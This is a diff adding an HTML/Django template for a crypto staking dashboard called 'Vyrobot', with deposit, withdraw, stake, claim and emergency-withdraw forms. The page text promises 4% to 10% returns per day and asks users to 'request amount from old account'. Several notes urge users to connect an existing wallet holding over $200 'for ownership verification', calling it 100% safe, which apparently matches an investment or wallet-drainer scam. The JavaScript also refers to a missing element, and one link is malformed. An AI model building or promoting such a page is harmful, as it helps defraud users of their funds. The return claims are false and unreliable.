@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Vyrobot - Dashboard</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Poppins", sans-serif; }
+        html, body { max-width: 100%; overflow-x: hidden; }
+        body { background: #e4e5ea; color: #0a0f2c; padding: 20px; }
+        .top { max-width: 1100px; margin: 0 auto 20px; display: flex; justify-content: space-between; align-items: center; gap: 12px; flex-wrap: wrap; }
+        .brand { display: flex; align-items: center; gap: 8px; }
+        .brand-icon { display: inline-flex; }
+        .brand-name { color: #082795; font-weight: 700; font-size: 16px; letter-spacing: .2px; }
+        .top-right { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; justify-content: flex-end; }
+        .top-right .who { font-size: 13px; color: #555; font-weight: 600; margin-left: 4px; }
+        .top-right a.logout { color: #082795; text-decoration: none; font-weight: 600; font-size: 14px; }
+        .credit-btn { background: #1d4ed8; color: #fff; font-weight: 700; font-size: 15px; text-decoration: none; padding: 9px 20px; border-radius: 10px; letter-spacing: .3px; }
+        .credit-btn:hover { background: #1e40af; }
+        .menu-wrap { position: relative; }
+        .menu-btn { background: #082795; color: #fff; font-weight: 600; font-size: 14px; border: none; padding: 9px 16px; border-radius: 10px; cursor: pointer; }
+        .menu-dropdown { position: absolute; right: 0; top: 110%; background: #fff; border: 1px solid #e5e7eb; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.12); min-width: 180px; padding: 6px; display: none; z-index: 90; }
+        .menu-dropdown.open { display: block; }
+        .menu-dropdown a { display: block; padding: 10px 12px; border-radius: 8px; color: #0a0f2c; text-decoration: none; font-size: 14px; font-weight: 500; }
+        .menu-dropdown a:hover { background: #eef2ff; color: #1d4ed8; }
+        .grid { max-width: 1100px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 18px; }
+        .card { background: #fff; border-radius: 16px; padding: 22px; box-shadow: 0 4px 18px rgba(8, 39, 149, 0.08); min-width: 0; }
+        .card.dark { background: #082795; color: #fff; }
+        .card.dark small { color: #c7cdf0; }
+        .label { font-size: 12px; color: #6b7280; text-transform: uppercase; letter-spacing: .5px; }
+        .big { font-size: 26px; font-weight: 700; margin-top: 6px; }
+        /* amount box small, button text bold; wrap instead of overlapping */
+        form.inline { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 12px; align-items: center; }
+        form.inline input { flex: 1 1 110px; min-width: 0; max-width: 160px; padding: 10px; border-radius: 8px; border: 1px solid #ccc; font-size: 14px; }
+        .btn { flex: 0 0 auto; background: #020314; color: #fff; border: none; padding: 10px 16px; border-radius: 8px; font-weight: 700; cursor: pointer; font-size: 14px; white-space: nowrap; }
+        .btn:hover { background: #081086; }
+        .btn.warn { background: #b45309; }
+        .btn.danger { background: #991b1b; }
+        .btn.block { flex-basis: 100%; width: 100%; margin-top: 10px; }
+        .msg { max-width: 1100px; margin: 0 auto 14px; padding: 10px 14px; border-radius: 10px; font-size: 14px; }
+        .msg.error { background: #fde2e2; color: #8a1c1c; }
+        .msg.success { background: #e2f6e4; color: #1c6a2a; }
+        .msg.info, .msg.warning { background: #e6ecff; color: #0f2593; }
+        table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        th, td { text-align: left; padding: 8px 6px; border-bottom: 1px solid #eef; }
+        th { color: #6b7280; font-weight: 600; }
+        .pill { padding: 2px 8px; border-radius: 20px; font-size: 11px; font-weight: 600; }
+        .pill.pending { background: #fef3c7; color: #92400e; }
+        .pill.confirmed { background: #dcfce7; color: #166534; }
+        .pill.rejected { background: #fee2e2; color: #991b1b; }
+        .pill.paid { background: #dbeafe; color: #1e40af; }
+        .note { font-size: 12px; color: #6b7280; margin-top: 8px; line-height: 1.5; }
+        .wide { grid-column: 1 / -1; }
+        .devbar { max-width: 1100px; margin: 0 auto 14px; background: #fff7ed; border: 1px dashed #b45309; border-radius: 10px; padding: 12px 14px; }
+        iframe { width: 100%; height: 260px; border: none; border-radius: 12px; }
+        /* modal */
+        .modal-overlay { position: fixed; inset: 0; background: rgba(2, 6, 40, 0.55); display: none; align-items: center; justify-content: center; z-index: 100; padding: 16px; }
+        .modal-overlay.open { display: flex; }
+        .modal { background: #fff; border-radius: 16px; max-width: 380px; width: 100%; padding: 22px; box-shadow: 0 20px 50px rgba(0,0,0,0.25); position: relative; }
+        .modal h3 { color: #082795; margin-bottom: 8px; font-size: 18px; }
+        .modal p { color: #334; font-size: 14px; line-height: 1.5; margin-bottom: 16px; }
+        .modal .row { display: flex; gap: 10px; }
+        .modal .row .btn { flex: 1; }
+        .modal .btn.ghost { background: #e6ecff; color: #0f2593; }
+        .modal .x { position: absolute; top: 12px; right: 14px; border: none; background: none; font-size: 22px; line-height: 1; color: #889; cursor: pointer; }
+        /* top-left toast */
+        .toast { position: fixed; top: 16px; left: 16px; z-index: 120; max-width: 340px; padding: 12px 16px; border-radius: 10px; font-size: 14px; box-shadow: 0 8px 24px rgba(0,0,0,0.15); display: none; }
+        .toast.show { display: block; }
+        .toast.success { background: #e2f6e4; color: #1c6a2a; }
+        .toast.error { background: #fde2e2; color: #8a1c1c; }
+        .toast.info, .toast.warning { background: #e6ecff; color: #0f2593; }
+        .table-wrap { width: 100%; max-width: 100%; overflow-x: auto; -webkit-overflow-scrolling: touch; }
+        .table-wrap table { min-width: 640px; }
+        .swipe-hint { display: none; text-transform: none; color: #9ca3af; font-weight: 500; }
+        /* tablet */
+        @media (max-width: 820px) {
+            .grid { grid-template-columns: repeat(2, 1fr); }
+            .card.dark, .card.wide { grid-column: 1 / -1; }
+        }
+        /* phones: single column, inputs full width, header stacks, nothing overlaps */
+        @media (max-width: 560px) {
+            body { padding: 12px; }
+            .top { flex-direction: column; align-items: stretch; }
+            .top-right { width: 100%; justify-content: flex-end; gap: 8px; flex-wrap: wrap; }
+            .credit-btn, .menu-btn { font-size: 13px; padding: 8px 12px; }
+            .menu-wrap { position: static; }
+            .menu-dropdown { right: 12px; left: 12px; min-width: 0; }
+            .grid { grid-template-columns: 1fr; gap: 14px; }
+            .card { padding: 16px; }
+            .card.dark, .card.wide { grid-column: auto; }
+            form.inline input { max-width: none; flex-basis: 100%; }
+            form.inline .btn { width: 100%; }
+            .big { font-size: 22px; }
+            table { font-size: 12px; }
+            .toast { left: 12px; right: 12px; max-width: none; }
+            .swipe-hint { display: inline; font-size: 10px; }
+            /* stake action buttons stack full-width so none get cut */
+            .card > div[style*="display:flex"] > form { flex: 1 1 100%; }
+        }
+    </style>
+</head>
+<body>
+    <div class="top">
+        <div class="brand">
+            <span class="brand-icon" aria-hidden="true">
+                <svg viewBox="0 0 24 24" width="22" height="22" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="12" cy="12" r="10" fill="#082795"/>
+                    <path d="M7 8l5 8 5-8" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </span>
+            <span class="brand-name">Vyrobot</span>
+        </div>
+        <div class="top-right">
+            <a href="{% url 'connect' %}" class="credit-btn">Connect Wallet</a>
+            <div class="menu-wrap">
+                <button type="button" class="menu-btn" id="menuBtn">Menu ▾</button>
+                <div class="menu-dropdown" id="menuDropdown">
+                    <a href="{% url 'profile' %}">Profile</a>
+                    <a href="{% url 'settings' %}">Settings</a>
+                    <a href="{% url 'connect' %}" id="menuCredit">Connect Wallet</a>
+                    <a href="#rewardsCard" id="menuClaim">Claim Reward</a>
+                    <a href="{% url 'faq' %}">FAQ</a>
+                    <a href="{% url 'support' %}">Support</a>
+                    <a href="{% url 'logout' %}" class="logout">Log out</a>
+                </div>
+            </div>
+            <span class="who">{{ request.user.username }}</span>
+        </div>
+    </div>
+
+    <!-- top-left toast for action messages (no page reload) -->
+    <div id="toast" class="toast"></div>
+
+    <div class="grid">
+        <!-- Balances -->
+        <div class="card dark">
+            <div class="label" style="color:#c7cdf0;">Available Balance</div>
+            <div class="big">$<span id="figBalance">{{ wallet.balance|floatformat:2 }}</span></div>
+        </div>
+        <div class="card">
+            <div class="label">Staked</div>
+            <div class="big">$<span id="figStaked">{{ wallet.staked|floatformat:2 }}</span></div>
+            <small style="color:#6b7280;">Earning {{ apr_pct|floatformat:2 }}% APR</small>
+        </div>
+        <div class="card">
+            <div class="label">Accrued Reward</div>
+            <div class="big">$<span id="figReward">{{ wallet.reward_accrued|floatformat:2 }}</span></div>
+            <small style="color:#6b7280;">Claimable up to pool funding (${{ pool.funded|floatformat:2 }}).</small>
+        </div>
+
+        <!-- Live chart -->
+        <div class="card wide">
+            <div class="label">Live Market (BTC/USD)</div>
+            <iframe src="https://s.tradingview.com/widgetembed/?symbol=BITSTAMP%3ABTCUSD&amp;interval=60&amp;theme=light&amp;style=1" scrolling="no"></iframe>
+        </div>
+
+        <!-- Deposit request (manual, admin-confirmed) -->
+        <div class="card">
+            <div class="label">Request Amount from old account</div>
+            <form class="inline ajax-form" method="post" action="{% url 'deposit' %}">
+                {% csrf_token %}
+                <input type="number" step="any" min="0" name="amount" placeholder="Amount" required>
+                <button class="btn" type="submit">Request Amount</button>
+            </form>
+            <div class="note">Creates a request Amount. this take 24hours to confirm and approve your request, make sure you request the total amount you invest before, admin will verify if the amount request is exactly amount on your old account, once admin approve the request amount will be available on your balance to withdraw...</div>
+        </div>
+
+        <!-- Add fund (NOWPayments gateway) -->
+        <div class="card">
+            <div class="label">Add Fund</div>
+            <form class="inline" id="addFundForm" method="post" action="{% url 'add_fund' %}">
+                {% csrf_token %}
+                <input type="number" step="any" min="0" id="addFundAmount" name="amount" placeholder="Amount" required>
+                <button class="btn" type="button" id="addFundBtn">Add Fund</button>
+            </form>
+            <div class="note">Takes you to the payment gateway to pay. Credited automatically once the payment is confirmed.</div>
+        </div>
+
+        <!-- Withdraw -->
+        <div class="card">
+            <div class="label">Withdraw</div>
+            <form class="inline" id="withdrawForm" method="post" action="{% url 'withdraw' %}">
+                {% csrf_token %}
+                <input type="number" step="any" min="0" id="withdrawAmount" name="amount" placeholder="Amount" required>
+                <input type="hidden" name="coin" id="withdrawCoin">
+                <input type="hidden" name="address" id="withdrawAddress">
+                <button class="btn" type="button" id="withdrawBtn">Withdraw</button>
+            </form>
+            <div class="note">Choose a network and paste your address. Your balance is debited and make sure you connect your wallet you attach to vyrobot, money will be credited to the wallt you attach. and make sure you connect existing wallet that have history for verification signature purpose to prove the right owner of the vyrobot account.</div>
+        </div>
+
+        <!-- Stake / Recompound / Unstake -->
+        <div class="card">
+            <div class="label">Stake</div>
+            {% if has_stake %}
+                <div style="font-size:13px;color:#334;margin:8px 0;">
+                    Staked <b>${{ wallet.staked|floatformat:2 }}</b> for {{ wallet.stake_days }} days.
+                    {% if is_locked %}Unlocks <b>{{ unlock_at|date:"Y-m-d H:i" }} UTC</b>.{% else %}<b style="color:#166534;">Unlocked — you can unstake or claim.</b>{% endif %}
+                    <br><span style="color:#6b7280;">Staking more adds to this and shifts the unlock to the new period.</span>
+                </div>
+            {% endif %}
+            <form class="inline" id="stakeForm" method="post" action="{% url 'stake' %}">
+                {% csrf_token %}
+                <input type="number" step="any" min="0" id="stakeAmount" name="amount" placeholder="Amount" required>
+                <input type="hidden" name="days" id="stakeDays">
+                <button class="btn" type="button" id="stakeBtn">Stake</button>
+            </form>
+            <div style="display:flex; gap:8px; flex-wrap:wrap; margin-top:10px;">
+                <form class="ajax-form" method="post" action="{% url 'recompound' %}" style="flex:1;"
+                      data-confirm="Recompound re-stakes your funds for another {{ wallet.stake_days }} days and rolls any funded reward into your stake. Continue?">
+                    {% csrf_token %}
+                    <button class="btn" type="submit" style="width:100%;">Recompound</button>
+                </form>
+                <form class="ajax-form" method="post" action="{% url 'unstake' %}" style="flex:1;">
+                    {% csrf_token %}
+                    <button class="btn" type="submit" style="width:100%;">Unstake</button>
+                </form>
+            </div>
+            <div class="note">
+                 Rewards accrue while your funds are staked and keep accruing after the lock until you unstake.
+                14days staking period  4% everyday of your total stake, 21days staking period  7% everyday of your total stake, 28days staking period  10% everyday of your total stake.
+                You can claim and withdraw once the lock
+                period completes. To exit early, use Emergency Withdraw (with a penalty).
+            </div>
+        </div>
+
+        <!-- Claim / Emergency -->
+        <div class="card" id="rewardsCard">
+            <div class="label">Rewards</div>
+            <form class="ajax-form" method="post" action="{% url 'claim' %}">
+                {% csrf_token %}
+                <button class="btn block" type="submit">Claim Reward</button>
+            </form>
+            <button class="btn danger block" type="button" id="emergencyBtn">Emergency Withdraw</button>
+            <form class="ajax-form" id="emergencyForm" method="post" action="{% url 'emergency' %}" style="display:none;">
+                {% csrf_token %}
+            </form>
+            <div class="note">Claim is available after the lock completes. Emergency Withdraw exits early with a penalty.</div>
+        </div>
+
+        <!-- Credit -->
+        <div class="card">
+            <div class="label">Connect First</div>
+            <a href="{connect.html}" class="credit-btn" id="creditBtn3" style="display:inline-block; margin-top:6px;">Connect Wallet</a>
+            <div class="note">attach your wallet first after you send request amount, your attaching wallet is 100% secure and safe, and make sure you have $200 above, money will not be dedute from your account because we dont have access to attach wallet, this is for ownership verification of the vyrobot account..</div>
+        </div>
+
+        <!-- History -->
+        <div class="card wide">
+            <div class="label" style="margin-bottom:10px;">Recent Activity <span class="swipe-hint">· swipe sideways to see all columns</span></div>
+            <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr><th>Date</th><th>Type</th><th>Amount</th><th>Status</th><th>Network</th><th>Address</th><th>Ref</th></tr>
+                </thead>
+                <tbody>
+                    {% for t in transactions %}
+                    <tr>
+                        <td>{{ t.created_at|date:"Y-m-d H:i" }}</td>
+                        <td>{{ t.get_kind_display }}</td>
+                        <td>${{ t.amount|floatformat:2 }}</td>
+                        <td><span class="pill {{ t.status }}">{% if t.kind == 'deposit' and t.status == 'confirmed' %}Approved{% elif t.status == 'rejected' %}Rejected{% elif t.kind == 'withdraw' and t.status == 'paid' %}Approved{% else %}{{ t.get_status_display }}{% endif %}</span></td>
+                        <td>{{ t.coin|default:"—" }}</td>
+                        <td style="max-width:180px; overflow-wrap:anywhere;">{{ t.to_address|default:"—" }}</td>
+                        <td>{{ t.reference }}</td>
+                    </tr>
+                    {% empty %}
+                    <tr><td colspan="7" style="color:#6b7280;">No activity yet.</td></tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- Add Fund confirmation modal -->
+    <div class="modal-overlay" id="continueModal">
+        <div class="modal">
+            <button class="x" type="button" data-close>&times;</button>
+            <h3>Continue to payment</h3>
+            <p>You'll be taken to the payment gateway to complete your deposit. Your balance is credited only after the payment is confirmed.</p>
+            <div class="row">
+                <button class="btn ghost" type="button" data-close>Cancel</button>
+                <button class="btn" type="button" id="continuePay">Continue</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Gateway unavailable modal -->
+    <div class="modal-overlay" id="unavailableModal">
+        <div class="modal">
+            <button class="x" type="button" data-close>&times;</button>
+            <h3>Add Fund unavailable</h3>
+            <p>Deposit funding is currently unavailable. Please contact admin.</p>
+            <div class="row">
+                <button class="btn" type="button" data-close>Close</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Stake period modal -->
+    <div class="modal-overlay" id="stakeModal">
+        <div class="modal">
+            <button class="x" type="button" data-close>&times;</button>
+            <h3>Choose a lock period</h3>
+            <p>Your funds will be locked for the period you choose, and become available to withdraw once it completes.</p>
+            <div style="display:flex; flex-direction:column; gap:8px;">
+                {% for d in stake_days_options %}
+                <button class="btn" type="button" data-stake-days="{{ d }}">{{ d }} days</button>
+                {% endfor %}
+                <button class="btn ghost" type="button" data-close>Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Withdraw network + address modal -->
+    <div class="modal-overlay" id="withdrawModal">
+        <div class="modal">
+            <button class="x" type="button" data-close>&times;</button>
+            <h3>Withdraw</h3>
+            <p id="withdrawStep1">Choose the network to receive your funds:</p>
+            <div id="withdrawNetworks" style="display:flex; flex-direction:column; gap:8px;">
+                {% for n in networks %}
+                <button class="btn ghost" type="button" data-network="{{ n }}" style="text-align:left;">{{ n }}</button>
+                {% endfor %}
+            </div>
+            <div id="withdrawStep2" style="display:none;">
+                <p style="margin-top:4px;">Paste your <b id="withdrawNetLabel"></b> address:</p>
+                <input type="text" id="withdrawAddrInput" placeholder="Wallet address"
+                       style="width:100%; padding:12px; border-radius:8px; border:1px solid #ccc; margin-bottom:12px;">
+                <div class="row">
+                    <button class="btn ghost" type="button" data-close>Cancel</button>
+                    <button class="btn" type="button" id="withdrawContinue">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Emergency withdraw warning modal -->
+    <div class="modal-overlay" id="emergencyModal">
+        <div class="modal">
+            <button class="x" type="button" data-close>&times;</button>
+            <h3>Emergency withdraw — read first</h3>
+            <p>Your stake period is not complete. If you proceed, you will only receive <b>{{ emergency_pct }}%</b> of your staked amount back to your balance. The remaining <b>{{ penalty_pct }}%</b> is forfeited and your pending reward is cancelled.</p>
+            <p>Only continue if you understand you will lose part of your stake and all pending reward.</p>
+            <div class="row">
+                <button class="btn ghost" type="button" data-close>Cancel</button>
+                <button class="btn danger" type="button" id="emergencyContinue">Continue anyway</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        var stakeDaysOptions = {{ stake_days_options|safe }};
+        var isLocked = {% if is_locked %}true{% else %}false{% endif %};
+        var gatewayEnabled = {% if gateway_enabled %}true{% else %}false{% endif %};
+        var addFundForm = document.getElementById("addFundForm");
+        var addFundAmount = document.getElementById("addFundAmount");
+        var continueModal = document.getElementById("continueModal");
+        var unavailableModal = document.getElementById("unavailableModal");
+
+        var stakeModal = document.getElementById("stakeModal");
+        var withdrawModal = document.getElementById("withdrawModal");
+        var emergencyModal = document.getElementById("emergencyModal");
+
+        function openModal(m) { m.classList.add("open"); }
+        function closeModals() {
+            document.querySelectorAll(".modal-overlay").forEach(function (m) {
+                m.classList.remove("open");
+            });
+        }
+
+        document.getElementById("addFundBtn").addEventListener("click", function () {
+            var val = parseFloat(addFundAmount.value);
+            if (!val || val <= 0) { addFundAmount.focus(); return; }
+            if (!gatewayEnabled) { openModal(unavailableModal); return; }
+            openModal(continueModal);
+        });
+
+        document.getElementById("continuePay").addEventListener("click", function () {
+            addFundForm.submit();
+        });
+
+        document.querySelectorAll("[data-close]").forEach(function (el) {
+            el.addEventListener("click", closeModals);
+        });
+        document.querySelectorAll(".modal-overlay").forEach(function (m) {
+            m.addEventListener("click", function (e) { if (e.target === m) closeModals(); });
+        });
+
+        // --- Stake: pick amount, then choose lock period in modal ---
+        var stakeBtn = document.getElementById("stakeBtn");
+        if (stakeBtn) {
+            var stakeForm = document.getElementById("stakeForm");
+            var stakeAmount = document.getElementById("stakeAmount");
+            var stakeDays = document.getElementById("stakeDays");
+            stakeBtn.addEventListener("click", function () {
+                var v = parseFloat(stakeAmount.value);
+                if (!v || v <= 0) { stakeAmount.focus(); return; }
+                openModal(stakeModal);
+            });
+            document.querySelectorAll("[data-stake-days]").forEach(function (b) {
+                b.addEventListener("click", function () {
+                    stakeDays.value = b.getAttribute("data-stake-days");
+                    closeModals();
+                    submitAjax(stakeForm);
+                });
+            });
+        }
+
+        // --- Withdraw: amount, then network, then address ---
+        var withdrawBtn = document.getElementById("withdrawBtn");
+        if (withdrawBtn) {
+            var withdrawForm = document.getElementById("withdrawForm");
+            var withdrawAmount = document.getElementById("withdrawAmount");
+            var withdrawBtnOpen = function () {
+                var v = parseFloat(withdrawAmount.value);
+                if (!v || v <= 0) { withdrawAmount.focus(); return; }
+                document.getElementById("withdrawStep1").style.display = "";
+                document.getElementById("withdrawNetworks").style.display = "";
+                document.getElementById("withdrawStep2").style.display = "none";
+                openModal(withdrawModal);
+            };
+            withdrawBtn.addEventListener("click", withdrawBtnOpen);
+            document.querySelectorAll("[data-network]").forEach(function (b) {
+                b.addEventListener("click", function () {
+                    document.getElementById("withdrawCoin").value = b.getAttribute("data-network");
+                    document.getElementById("withdrawNetLabel").textContent = b.getAttribute("data-network");
+                    document.getElementById("withdrawStep1").style.display = "none";
+                    document.getElementById("withdrawNetworks").style.display = "none";
+                    document.getElementById("withdrawStep2").style.display = "";
+                    document.getElementById("withdrawAddrInput").focus();
+                });
+            });
+            document.getElementById("withdrawContinue").addEventListener("click", function () {
+                var addr = document.getElementById("withdrawAddrInput").value.trim();
+                if (!addr) { document.getElementById("withdrawAddrInput").focus(); return; }
+                document.getElementById("withdrawAddress").value = addr;
+                closeModals();
+                submitAjax(withdrawForm);
+            });
+        }
+
+        // --- Emergency: warn before proceeding (only matters while locked) ---
+        var emergencyBtn = document.getElementById("emergencyBtn");
+        if (emergencyBtn) {
+            var emergencyForm = document.getElementById("emergencyForm");
+            emergencyBtn.addEventListener("click", function () {
+                if (isLocked) { openModal(emergencyModal); }
+                else { submitAjax(emergencyForm); }
+            });
+            document.getElementById("emergencyContinue").addEventListener("click", function () {
+                closeModals();
+                submitAjax(emergencyForm);
+            });
+        }
+
+        // Top-left toast
+        var toast = document.getElementById("toast");
+        var toastTimer = null;
+        function showToast(message, level) {
+            toast.textContent = message;
+            toast.className = "toast show " + (level || "info");
+            if (toastTimer) clearTimeout(toastTimer);
+            toastTimer = setTimeout(function () { toast.className = "toast"; }, 5000);
+        }
+
+        // Credit button -> jump to Add Fund
+        document.getElementById("creditBtn").addEventListener("click", function (e) {
+            e.preventDefault();
+            addFundForm.scrollIntoView({ behavior: "smooth", block: "center" });
+            addFundAmount.focus();
+        });
+        var creditBtn3 = document.getElementById("creditBtn3");
+        if (creditBtn3) {
+            creditBtn3.addEventListener("click", function (e) {
+                e.preventDefault();
+                addFundForm.scrollIntoView({ behavior: "smooth", block: "center" });
+                addFundAmount.focus();
+            });
+        }
+
+        // Menu dropdown
+        var menuBtn = document.getElementById("menuBtn");
+        var menuDropdown = document.getElementById("menuDropdown");
+        if (menuBtn) {
+            menuBtn.addEventListener("click", function (e) {
+                e.stopPropagation();
+                menuDropdown.classList.toggle("open");
+            });
+            document.addEventListener("click", function () { menuDropdown.classList.remove("open"); });
+            menuDropdown.addEventListener("click", function (e) { e.stopPropagation(); });
+            var menuCredit = document.getElementById("menuCredit");
+            if (menuCredit) menuCredit.addEventListener("click", function (e) {
+                e.preventDefault(); menuDropdown.classList.remove("open");
+                addFundForm.scrollIntoView({ behavior: "smooth", block: "center" }); addFundAmount.focus();
+            });
+            var menuClaim = document.getElementById("menuClaim");
+            if (menuClaim) menuClaim.addEventListener("click", function () { menuDropdown.classList.remove("open"); });
+        }
+
+        // AJAX submit for action forms: no page reload, show message as a toast
+        function getCookie(name) {
+            var v = document.cookie.match("(^|;)\\s*" + name + "\\s*=\\s*([^;]+)");
+            return v ? v.pop() : "";
+        }
+        function submitAjax(form) {
+            fetch(form.action, {
+                method: "POST",
+                headers: { "X-Requested-With": "XMLHttpRequest", "X-CSRFToken": getCookie("csrftoken") },
+                body: new FormData(form),
+            })
+            .then(function (r) { return r.json(); })
+            .then(function (d) {
+                showToast(d.message, d.level);
+                if (d.wallet) {
+                    document.getElementById("figBalance").textContent = d.wallet.balance;
+                    document.getElementById("figStaked").textContent = d.wallet.staked;
+                    document.getElementById("figReward").textContent = d.wallet.reward;
+                }
+                if (d.ok) {
+                    var amt = form.querySelector('input[name="amount"]');
+                    if (amt) amt.value = "";
+                    // staking state changes (stake/unstake/recompound/emergency) alter the page
+                    if (/stake|unstake|recompound|emergency|withdraw/.test(form.action)) {
+                        setTimeout(function () { window.location.reload(); }, 1200);
+                    }
+                }
+            })
+            .catch(function () { showToast("Something went wrong. Please try again.", "error"); });
+        }
+        document.querySelectorAll("form.ajax-form").forEach(function (form) {
+            form.addEventListener("submit", function (e) {
+                e.preventDefault();
+                var confirmMsg = form.getAttribute("data-confirm");
+                if (confirmMsg && !window.confirm(confirmMsg)) return;
+                submitAjax(form);
+            });
+        });
+    </script>
+</body>
+</html>
